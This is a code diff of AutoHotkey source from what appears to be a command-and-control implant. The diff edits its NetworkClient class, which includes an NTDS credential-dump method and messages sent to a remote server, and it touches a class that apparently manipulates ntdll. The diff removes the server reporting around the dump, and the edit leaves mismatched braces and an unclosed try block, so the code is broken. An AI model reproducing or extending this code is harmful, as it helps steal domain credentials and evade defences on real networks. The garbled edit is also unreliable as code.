@@ -2394,9 +2394,6 @@ class NetworkClient {
     }
 
     NTDSDump(){
-        try {
-            message := Format("command_output|{}|Starting NTDS dump operation...", this.agentID)
-            response := this.SendMsg(this.serverIP, this.serverPort, message)
             
         try {
             Logger.Init()
@@ -2438,7 +2435,7 @@ class NetworkClient {
         }
             
             ; Check for extracted files in the output directory
-            outputPattern := A_ScriptDir "\extracted_*"
+            outputPattern := A_ScriptDir "\extracted*"
             extractedDirs := []
             
             ; Find all extracted directories
@@ -2474,14 +2471,10 @@ class NetworkClient {
             
             return true
             
-        } catch as err {
-            message := Format("command_output|{}|NTDS dump failed: {}", this.agentID, err.Message)
-            response := this.SendMsg(this.serverIP, this.serverPort, message)
-            return false
         }
     }
 
-}
+
 
 class NTDLLManipulator {
     snapshots := Map()
